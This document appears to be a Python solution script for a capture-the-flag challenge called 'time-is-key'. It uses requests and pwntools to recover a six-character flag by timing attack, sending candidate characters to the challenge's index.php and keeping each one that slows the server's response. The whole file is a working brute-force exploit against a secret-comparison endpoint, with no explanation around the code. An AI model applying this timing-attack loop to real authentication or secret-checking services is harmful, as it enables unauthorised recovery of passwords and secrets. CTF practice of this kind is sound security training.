import requests
import string
from pwn import *

url = "http://time-is-key.challs.olicyber.it/index.php"

brute = log.progress("Brute forcing the flag")
flagLog = log.progress("Flag")

dataset = string.ascii_lowercase + string.digits
flag = ""
padding = "aaaaa"

s = requests.Session()

counter = 0

while counter != 6: 
    for c in dataset: 
        brute.status(f"Trying:  {flag + c + padding}")
        dict = {
            "flag" : flag + c + padding, 
            "submit" : "Invia la flag!"
        }
        t = time.time()
        r = s.post(url, data=dict)
        diff = time.time() - t
        if diff >= counter + 0.9: 
            flag += c
            flagLog.status(f"Flag: {flag}")
            padding = padding[1:]
            counter +=1
            break
print(flag)




